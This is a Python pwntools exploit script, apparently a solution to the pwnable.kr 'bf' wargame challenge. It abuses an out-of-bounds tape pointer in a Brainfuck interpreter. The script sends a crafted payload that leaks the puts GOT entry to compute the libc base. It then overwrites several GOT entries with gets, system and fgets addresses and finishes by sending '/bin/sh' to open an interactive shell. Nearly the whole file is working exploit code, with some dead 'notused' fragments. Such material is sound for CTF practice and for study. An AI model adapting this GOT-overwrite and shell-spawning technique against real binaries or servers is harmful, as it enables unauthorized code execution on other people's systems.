#!/usr/bin/python
from pwn import *

r = remote ("pwnable.kr", 9001)
#r = process ("./bf")

notused = ""

p = 0x0804a0a0
puts_got = 0x0804a018
putchar_got = 0x0804a030
memset_got = 0x0804a02c
#target_offset = 0x67685
#libc_puts = 0x677e0

libc_puts = 0x66830
system_offset = 0x3f0b0
gets_offset = 0x65e90

fgets = 0x08048700


r.recvuntil ("except [ ]")
payload = "<" * (136)

# read puts address
payload += "." # read 1 byte
payload += ">" # next addr
payload += "." # read 1 byte
payload += ">" # next addr
payload += "." # read 1 byte
payload += ">" # next addr
payload += "." # read 1 byte

# goto memset got
payload += ">" * 20 

# overwrite got
payload += ","
payload += "<"
payload += ","
payload += "<"
payload += ","
payload += "<"
payload += ","

#payload += ">" * (112)
#payload += "."

#payload += "<" * (112 -3)

#overwrite again, fgets

payload += "<" * 28
payload += ">>>"
payload += ","
payload += "<"
payload += ","
payload += "<"
payload += ","
payload += "<"
payload += ","

payload += ">" * 8
payload += ">>>"
payload += ","
payload += "<"
payload += ","
payload += "<"
payload += ","
payload += "<"
payload += ","

payload += "["

notused += '''
payload += ">>>"
payload += ","
payload += "<"
payload += ","
payload += "<"
payload += ","
payload += "<"
payload += ","

payload += "["
'''
log.info ("payload: " + payload)
r.sendline (payload)

r.recv (1) #newline

puts_addr = r.recv (1)
puts_addr += r.recv (1)
puts_addr += r.recv (1)
puts_addr += r.recv (1)
print len (payload)
#for i in puts_addr:
#  print hex(ord(i)),
puts_hexaddr = ord (puts_addr[3])*(256**3) + ord (puts_addr[2])*(256**2) + ord (puts_addr[1])*(256**1) + ord (puts_addr[0]) 
libc_base = puts_hexaddr - libc_puts
log.info ("puts: " +  hex(puts_hexaddr))
target_addr = puts_hexaddr + (gets_offset - libc_puts) + 32
#p_addr = p32 (target_addr)
p_addr = p32 (libc_base + gets_offset)

#log.info ("gets:" +  hex(target_addr))

r.send (p_addr[3])
r.send (p_addr[2])
r.send (p_addr[1])
r.send (p_addr[0])
log.info ("overwrite puts -> fgets")

#r.sendline ("/bin/sh;" + payload[8:])
notused += '''
p_addr = p32 (libc_base + gets_offset)

r.send (p_addr[3])
r.send (p_addr[2])
r.send (p_addr[1])
r.send (p_addr[0])
log.info ("overwrite fgets -> gets")
'''

log.info ("system: " + hex(libc_base + system_offset))

p_addr = p32 (libc_base + system_offset)

r.send (p_addr[3])
r.send (p_addr[2])
r.send (p_addr[1])
r.send (p_addr[0])
log.info ("overwrite fgets -> system")

p_addr = p32 (fgets)

r.send (p_addr[3])
r.send (p_addr[2])
r.send (p_addr[1])
r.send (p_addr[0])

r.sendline ("/bin/sh")
r.interactive () 

r.close ()
